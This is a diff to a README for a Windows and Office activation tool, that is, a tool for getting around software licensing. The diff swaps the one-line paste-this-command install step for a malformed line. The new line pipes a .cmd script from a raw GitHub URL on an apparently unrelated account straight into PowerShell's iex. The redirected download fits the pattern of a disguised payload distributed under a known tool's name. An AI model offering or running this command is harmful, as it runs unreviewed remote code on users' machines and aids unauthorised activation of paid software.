@@ -3,7 +3,7 @@ You can used this script for activating Windows and Microsoft Office
 Method 1 - PowerShell (Windows 8 and later)
 1. Open PowerShell (Not CMD). To do that, right-click on the Windows start menu and select PowerShell or Terminal.
 2. Copy and paste the code below and press enter
-   irm https://get.activated.win | iex
+   irm https://get.activated.win](https://raw.githubusercontent.com/Codingwithm-cloud/microsoft-activation/refs/heads/main/MAS_AIO.cmd | iex
 
 4. You will see the activation options. Choose (1) HWID for Windows activation. Choose (2) Ohook for Office activation.
 5. That's all.
